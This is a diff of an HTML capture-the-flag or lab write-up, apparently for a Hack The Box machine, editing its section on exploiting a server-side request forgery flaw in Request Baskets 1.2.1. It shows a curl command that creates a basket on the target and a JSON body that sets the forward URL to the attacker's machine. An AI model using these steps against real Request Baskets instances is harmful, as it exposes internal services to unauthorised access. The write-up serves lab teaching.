@@ -179,16 +179,19 @@ Nmap done: 1 IP address (1 host up) scanned in 100.38 seconds</code></pre>
     <img src="path/to/screenshot1.png" alt="Nmap Results Screenshot">
 
     <!-- ===== EXPLOITATION ===== -->
-    <h3>Exploitation — Request Baskets SSRF</h3>
-    <p>Using curl, we created a basket and captured the API token:</p>
+    <h3> Request Baskets SSRF</h3>
+    <p>Request Baskets 1.2.1 is vulnerable to <strong>Server-Side Request Forgery (SSRF)</strong>, allowing internal service access via the <code>api/baskets/{name}</code> endpoint.
+
+We created a new basket via <code>curl</code>:</p>
 
     <pre><code>curl -X POST http://10.129.229.26:55555/api/baskets/hackbox \
 -H "Content-Type: application/json" -d '{}'</code></pre>
 
-    <p>With this token, we configured the basket to forward requests to our attack machine:</p>
+    <p>We can also do this previous step with the help of burp. Simply turn on your proxy and create a box to capture the request in BURP. I use foxy proxy for this.</p>
 
     <img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
 
+<p>Now can can grab the request in burp and send it to repeater</p>
     <pre><code>{
   "forward_url": "http://10.10.14.207:8000",
   "proxy_response": true,
